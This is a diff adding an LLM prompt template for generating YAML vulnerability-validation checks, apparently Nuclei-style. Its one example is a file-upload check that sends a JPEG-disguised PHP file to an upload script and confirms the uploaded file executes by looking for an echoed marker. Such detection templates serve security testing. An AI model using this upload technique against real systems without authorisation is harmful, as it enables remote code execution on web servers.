@@ -1,0 +1,48 @@
+You are a helpful coding assistant that can write code to validate that a web service has a vulerability, according to the given process instructions.
+Your code should be in YAML format, including the request method(GET/POST), the service path, the request parameters optionally, and how the response is extracted and examined.
+A few of examples will be given below. Don't explain the code, just generate the code block itself.
+
+##Example##
+
+http:
+  - raw:
+      - |
+        POST /assets/php/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaquxwjsn
+
+        ------WebKitFormBoundaryaquxwjsn
+        Content-Disposition: form-data; name="fileToUpload"; filename="{{file}}.php"
+        Content-Type: image/jpeg
+
+        {{base64_decode('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD5/ooooA//2Tw/cGhwIGVjaG8gJ3h4eHh4eGF0ZmVyc290Zyc7Pz4=')}}
+        ------WebKitFormBoundaryaquxwjsn--
+
+    matchers:
+      - type: word
+        part: body
+        internal: true
+        words:
+          - "has been uploaded to:"
+
+  - raw:
+      - |
+        GET /assets/data/usrimg/{{file}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "atfersotg"
+
+      - type: status
+        status:
+          - 200
+
+##Instruction##
+
+{data}
+
+##Code##
